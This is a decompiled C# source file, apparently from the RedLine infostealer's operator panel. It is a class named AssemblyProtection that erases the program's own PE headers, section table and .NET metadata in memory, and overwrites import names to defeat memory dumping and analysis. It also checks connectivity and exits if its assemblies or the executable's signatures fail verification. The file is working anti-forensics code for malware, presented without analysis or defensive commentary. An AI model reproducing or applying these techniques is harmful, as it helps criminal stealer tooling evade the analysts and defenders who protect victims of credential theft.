using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using RedLine.MainPanel.Data.Helpers;

namespace RedLine.MainPanel.Data.Core;

public static class AssemblyProtection
{
	[Flags]
	private enum InternetConnectionState_e
	{
		INTERNET_CONNECTION_MODEM = 1,
		INTERNET_CONNECTION_LAN = 2,
		INTERNET_CONNECTION_PROXY = 4,
		INTERNET_RAS_INSTALLED = 0x10,
		INTERNET_CONNECTION_OFFLINE = 0x20,
		INTERNET_CONNECTION_CONFIGURED = 0x40
	}

	[DllImport("wininet.dll", CharSet = CharSet.Auto)]
	private static extern bool InternetGetConnectedState(ref InternetConnectionState_e lpdwFlags, int dwReserved);

	[DllImport("kernel32.dll")]
	private static extern IntPtr ZeroMemory(IntPtr addr, IntPtr size);

	[DllImport("kernel32.dll")]
	private unsafe static extern bool VirtualProtect(byte* lpAddress, int dwSize, uint flNewProtect, out uint lpflOldProtect);

	public static bool EthernetConnected()
	{
		try
		{
			InternetConnectionState_e lpdwFlags = (InternetConnectionState_e)0;
			bool flag = InternetGetConnectedState(ref lpdwFlags, 0);
			IPStatus iPStatus = IPStatus.Unknown;
			try
			{
				iPStatus = new Ping().Send("google.com").Status;
			}
			catch (Exception)
			{
			}
			return iPStatus == IPStatus.Success && flag;
		}
		catch
		{
			return false;
		}
	}

	public unsafe static void Initialize()
	{
		Module module = typeof(AssemblyProtection).Module;
		byte* ptr = (byte*)(void*)Marshal.GetHINSTANCE(module);
		byte* ptr2 = ptr + 60;
		ptr2 = ptr + (uint)(*(int*)ptr2);
		ptr2 += 6;
		ushort num = *(ushort*)ptr2;
		ptr2 += 14;
		ushort num2 = *(ushort*)ptr2;
		ptr2 = ptr2 + 4 + (int)num2;
		byte* ptr3 = stackalloc byte[11];
		uint lpflOldProtect;
		if (module.FullyQualifiedName[0] == '<')
		{
			uint num3 = *(uint*)(ptr2 - 16);
			uint num4 = *(uint*)(ptr2 - 120);
			uint[] array = new uint[num];
			uint[] array2 = new uint[num];
			uint[] array3 = new uint[num];
			for (int i = 0; i < num; i++)
			{
				VirtualProtect(ptr2, 8, 64u, out lpflOldProtect);
				Marshal.Copy(new byte[8], 0, (IntPtr)ptr2, 8);
				array[i] = *(uint*)(ptr2 + 12);
				array2[i] = *(uint*)(ptr2 + 8);
				array3[i] = *(uint*)(ptr2 + 20);
				ptr2 += 40;
			}
			if (num4 != 0)
			{
				for (int j = 0; j < num; j++)
				{
					if (array[j] <= num4 && num4 < array[j] + array2[j])
					{
						num4 = num4 - array[j] + array3[j];
						break;
					}
				}
				byte* ptr4 = ptr + num4;
				uint num5 = *(uint*)ptr4;
				for (int k = 0; k < num; k++)
				{
					if (array[k] <= num5 && num5 < array[k] + array2[k])
					{
						num5 = num5 - array[k] + array3[k];
						break;
					}
				}
				byte* ptr5 = ptr + num5;
				uint num6 = *(uint*)(ptr4 + 12);
				for (int l = 0; l < num; l++)
				{
					if (array[l] <= num6 && num6 < array[l] + array2[l])
					{
						num6 = num6 - array[l] + array3[l];
						break;
					}
				}
				uint num7 = *(uint*)ptr5 + 2;
				for (int m = 0; m < num; m++)
				{
					if (array[m] <= num7 && num7 < array[m] + array2[m])
					{
						num7 = num7 - array[m] + array3[m];
						break;
					}
				}
				VirtualProtect(ptr + num6, 11, 64u, out lpflOldProtect);
				*(int*)ptr3 = 1818522734;
				*(int*)(ptr3 + 4) = 1818504812;
				*(short*)(ptr3 + (nint)4 * (nint)2) = 108;
				ptr3[10] = 0;
				for (int n = 0; n < 11; n++)
				{
					(ptr + num6)[n] = ptr3[n];
				}
				VirtualProtect(ptr + num7, 11, 64u, out lpflOldProtect);
				*(int*)ptr3 = 1866691662;
				*(int*)(ptr3 + 4) = 1852404846;
				*(short*)(ptr3 + (nint)4 * (nint)2) = 25973;
				ptr3[10] = 0;
				for (int num8 = 0; num8 < 11; num8++)
				{
					(ptr + num7)[num8] = ptr3[num8];
				}
			}
			for (int num9 = 0; num9 < num; num9++)
			{
				if (array[num9] <= num3 && num3 < array[num9] + array2[num9])
				{
					num3 = num3 - array[num9] + array3[num9];
					break;
				}
			}
			byte* ptr6 = ptr + num3;
			VirtualProtect(ptr6, 72, 64u, out lpflOldProtect);
			uint num10 = *(uint*)(ptr6 + 8);
			for (int num11 = 0; num11 < num; num11++)
			{
				if (array[num11] <= num10 && num10 < array[num11] + array2[num11])
				{
					num10 = num10 - array[num11] + array3[num11];
					break;
				}
			}
			*(int*)ptr6 = 0;
			*(int*)(ptr6 + 4) = 0;
			*(int*)(ptr6 + (nint)2 * (nint)4) = 0;
			*(int*)(ptr6 + (nint)3 * (nint)4) = 0;
			byte* ptr7 = ptr + num10;
			VirtualProtect(ptr7, 4, 64u, out lpflOldProtect);
			*(int*)ptr7 = 0;
			ptr7 += 12;
			ptr7 += (uint)(*(int*)ptr7);
			ptr7 = (byte*)(((ulong)ptr7 + 7uL) & 0xFFFFFFFFFFFFFFFCuL);
			ptr7 += 2;
			ushort num12 = *ptr7;
			ptr7 += 2;
			for (int num13 = 0; num13 < num12; num13++)
			{
				VirtualProtect(ptr7, 8, 64u, out lpflOldProtect);
				ptr7 += 4;
				ptr7 += 4;
				for (int num14 = 0; num14 < 8; num14++)
				{
					VirtualProtect(ptr7, 4, 64u, out lpflOldProtect);
					*ptr7 = 0;
					ptr7++;
					if (*ptr7 != 0)
					{
						*ptr7 = 0;
						ptr7++;
						if (*ptr7 != 0)
						{
							*ptr7 = 0;
							ptr7++;
							if (*ptr7 != 0)
							{
								*ptr7 = 0;
								ptr7++;
								continue;
							}
							ptr7++;
							break;
						}
						ptr7 += 2;
						break;
					}
					ptr7 += 3;
					break;
				}
			}
			return;
		}
		byte* ptr8 = ptr + (uint)(*(int*)(ptr2 - 16));
		if (*(uint*)(ptr2 - 120) != 0)
		{
			byte* ptr9 = ptr + (uint)(*(int*)(ptr2 - 120));
			byte* ptr10 = ptr + (uint)(*(int*)ptr9);
			byte* ptr11 = ptr + (uint)(*(int*)(ptr9 + 12));
			byte* ptr12 = ptr + (uint)(*(int*)ptr10) + 2;
			VirtualProtect(ptr11, 11, 64u, out lpflOldProtect);
			*(int*)ptr3 = 1818522734;
			*(int*)(ptr3 + 4) = 1818504812;
			*(short*)(ptr3 + (nint)4 * (nint)2) = 108;
			ptr3[10] = 0;
			for (int num15 = 0; num15 < 11; num15++)
			{
				ptr11[num15] = ptr3[num15];
			}
			VirtualProtect(ptr12, 11, 64u, out lpflOldProtect);
			*(int*)ptr3 = 1866691662;
			*(int*)(ptr3 + 4) = 1852404846;
			*(short*)(ptr3 + (nint)4 * (nint)2) = 25973;
			ptr3[10] = 0;
			for (int num16 = 0; num16 < 11; num16++)
			{
				ptr12[num16] = ptr3[num16];
			}
		}
		for (int num17 = 0; num17 < num; num17++)
		{
			VirtualProtect(ptr2, 8, 64u, out lpflOldProtect);
			Marshal.Copy(new byte[8], 0, (IntPtr)ptr2, 8);
			ptr2 += 40;
		}
		VirtualProtect(ptr8, 72, 64u, out lpflOldProtect);
		byte* ptr13 = ptr + (uint)(*(int*)(ptr8 + 8));
		*(int*)ptr8 = 0;
		*(int*)(ptr8 + 4) = 0;
		*(int*)(ptr8 + (nint)2 * (nint)4) = 0;
		*(int*)(ptr8 + (nint)3 * (nint)4) = 0;
		VirtualProtect(ptr13, 4, 64u, out lpflOldProtect);
		*(int*)ptr13 = 0;
		ptr13 += 12;
		ptr13 += (uint)(*(int*)ptr13);
		ptr13 = (byte*)(((ulong)ptr13 + 7uL) & 0xFFFFFFFFFFFFFFFCuL);
		ptr13 += 2;
		ushort num18 = *ptr13;
		ptr13 += 2;
		for (int num19 = 0; num19 < num18; num19++)
		{
			VirtualProtect(ptr13, 8, 64u, out lpflOldProtect);
			ptr13 += 4;
			ptr13 += 4;
			for (int num20 = 0; num20 < 8; num20++)
			{
				VirtualProtect(ptr13, 4, 64u, out lpflOldProtect);
				*ptr13 = 0;
				ptr13++;
				if (*ptr13 != 0)
				{
					*ptr13 = 0;
					ptr13++;
					if (*ptr13 != 0)
					{
						*ptr13 = 0;
						ptr13++;
						if (*ptr13 != 0)
						{
							*ptr13 = 0;
							ptr13++;
							continue;
						}
						ptr13++;
						break;
					}
					ptr13 += 2;
					break;
				}
				ptr13 += 3;
				break;
			}
		}
	}

	public static void CheckAssemblies()
	{
		try
		{
			foreach (string item in from x in AppDomain.CurrentDomain.GetAssemblies()
				select x.Location)
			{
				try
				{
					if (new FileInfo(item).Name.Contains("System") && !AuthenticodeTools.IsTrusted(item, extraCheck: false, "Microsoft Corporation"))
					{
						EventLog.WriteEntry("Panel.exe", new FileInfo(item).Name, EventLogEntryType.Error);
						Environment.Exit(0);
					}
				}
				catch
				{
				}
			}
			if (!AuthenticodeTools.IsTrusted(Application.ExecutablePath, extraCheck: true, "ÆLLEBIO LTD", "7A49CBB0787A74703666620509AEB043"))
			{
				Environment.Exit(0);
			}
		}
		catch (Exception)
		{
		}
	}
}
